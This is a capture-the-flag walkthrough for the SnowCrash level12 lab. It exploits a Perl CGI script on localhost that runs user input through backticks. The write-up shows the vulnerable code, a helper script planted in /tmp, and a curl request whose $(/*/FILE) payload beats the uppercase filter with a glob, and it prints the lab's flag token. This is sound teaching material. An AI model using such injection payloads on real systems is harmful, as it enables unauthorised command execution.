# Level12 Walkthrough

## Overview
This level exploits a Perl CGI script running on localhost:4646. The script uses unsafe user input in a shell command via backticks (`egrep`), allowing command injection through the `x` parameter.

## Walkthrough

### 1. Explore the files
```bash
level12@SnowCrash:~$ ls -l
-rwsr-sr-x+ 1 flag12 level12 464 Mar 5 2016 level12.pl
Bashlevel12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

## 2. Prepare the payload

Create a malicious executable in /tmp:


```Bash
level12@SnowCrash:~$ echo '#!/bin/sh' > /tmp/FILE
level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' >> /tmp/FILE
level12@SnowCrash:~$ chmod +x /tmp/FILE
```

### 3. Exploit via command injection
The vulnerability is in this line:
perl@output = `egrep "^$xx" /tmp/xd 2>&1`;


User input (param("x")) is passed directly to a shell command.
Trigger the exploit using command substitution:

```Bash
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=$(/*/FILE)'
```

## 4. Read the flag

```Bash
level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
